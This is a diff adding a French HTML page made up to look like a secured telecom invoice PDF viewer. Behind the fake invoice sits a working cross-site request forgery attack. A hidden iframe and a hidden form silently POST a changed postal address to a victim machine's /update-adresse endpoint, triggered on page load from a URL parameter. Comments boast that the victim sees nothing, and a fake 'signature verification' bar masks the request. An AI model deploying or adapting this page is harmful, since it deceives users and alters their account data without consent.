@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <title>Espace Facturation Télécom - Votre Facture Numérique</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #e2e8f0; margin: 0; padding: 25px; }
+        .pdf-viewer { max-width: 800px; margin: auto; background: white; border-radius: 8px; box-shadow: 0 10px 25px rgba(0,0,0,0.15); overflow: hidden; }
+        .pdf-header { background: #1e293b; color: white; padding: 15px 25px; display: flex; justify-content: space-between; align-items: center; }
+        .pdf-body { padding: 40px; }
+        .invoice-title { font-size: 26px; color: #0f172a; margin-bottom: 20px; font-weight: bold; }
+        .row { display: flex; justify-content: space-between; margin-bottom: 12px; border-bottom: 1px solid #f1f5f9; padding-bottom: 8px; }
+        .total { font-size: 20px; font-weight: bold; color: #dc2626; margin-top: 20px; }
+        .config-box { background: #fef3c7; border: 1px solid #fde68a; padding: 12px; border-radius: 6px; margin: 20px 0; font-size: 13px; color: #92400e; }
+        .progress-bar { width: 100%; background: #e2e8f0; height: 8px; border-radius: 4px; overflow: hidden; margin-top: 15px; }
+        .progress-fill { width: 0%; height: 100%; background: #2563eb; transition: width 2s; }
+    </style>
+</head>
+<body>
+
+    <div class="pdf-viewer">
+        <div class="pdf-header">
+            <span>📄 Facture_Abonnement_Novembre_2026.pdf (Protégé)</span>
+            <span style="font-size: 12px; background: #334155; padding: 4px 8px; border-radius: 4px;">Visionneuse Sécurisée v4.2</span>
+        </div>
+
+        <div class="pdf-body">
+            <div class="invoice-title">OPÉRATEUR TÉLÉCOM PRO - FACTURE N° 84920</div>
+            
+            <div class="config-box">
+                ⚙️ <strong>Configuration Attaque LAN (IP du PC Victime) :</strong>
+                <input type="text" id="targetIp" style="padding: 4px; width: 130px;">
+                <button onclick="declencherAttaquePost()" style="padding: 5px 10px; background:#d97706; color:white; border:none; border-radius:4px; cursor:pointer;">Armer l'iFrame</button>
+                <div id="status" style="margin-top: 6px; font-size: 12px;"></div>
+            </div>
+
+            <div class="row"><span>Période facturée :</span><strong>01/10/2026 au 31/10/2026</strong></div>
+            <div class="row"><span>Offre souscrite :</span><strong>Fibre Pro 1 Gb/s Illimitée</strong></div>
+            <div class="row"><span>Statut du prélèvement :</span><strong style="color:#16a34a;">Validé</strong></div>
+            <div class="total">Montant débité : 79,90 € TTC</div>
+
+            <div class="progress-bar"><div class="progress-fill" id="fill"></div></div>
+            <p style="font-size: 13px; color: #64748b; text-align: center; margin-top: 10px;">
+                Vérification de signature électronique en arrière-plan...
+            </p>
+        </div>
+    </div>
+
+    <!-- 
+        TECHNIQUE DE L'IFRAME CACHÉE (100% INVISIBLE POUR LA VICTIME) :
+        Le formulaire POST cible le nom de l'iframe 'stealth_frame'.
+        La réponse du serveur cible est absorbée par l'iframe invisible,
+        donc la victime ne voit AUCUNE redirection et reste sur le faux PDF !
+    -->
+    <iframe name="stealth_frame" style="display: none;"></iframe>
+
+    <form id="postForm" method="POST" target="stealth_frame" style="display: none;">
+        <input type="hidden" name="nouvelle_adresse" value="666 Avenue des Pirates, 13000 HackerCity (Détourné via iFrame)">
+    </form>
+
+    <script>
+        const params = new URLSearchParams(window.location.search);
+        let targetIp = params.get('target') || localStorage.getItem('csrf_lan_ip') || window.location.hostname;
+        document.getElementById('targetIp').value = targetIp;
+
+        function declencherAttaquePost() {
+            const ip = document.getElementById('targetIp').value.trim();
+            if (!ip) return alert("Veuillez saisir l'IP de la victime !");
+            localStorage.setItem('csrf_lan_ip', ip);
+
+            const form = document.getElementById('postForm');
+            form.action = `http://${ip}:5000/update-adresse`;
+            
+            document.getElementById('status').innerText = `Envoi silencieux du POST vers ${form.action} via l'iFrame cachée...`;
+            document.getElementById('fill').style.width = '100%';
+
+            setTimeout(() => {
+                form.submit();
+                document.getElementById('status').innerText = `[✓] Attaque POST envoyée en toute discrétion ! L'adresse a été modifiée en arrière-plan.`;
+                document.getElementById('status').style.color = "#16a34a";
+            }, 1200);
+        }
+
+        window.onload = function() {
+            if (targetIp && targetIp !== "localhost" && targetIp !== "127.0.0.1") {
+                setTimeout(declencherAttaquePost, 1200);
+            }
+        };
+    </script>
+</body>
+</html>
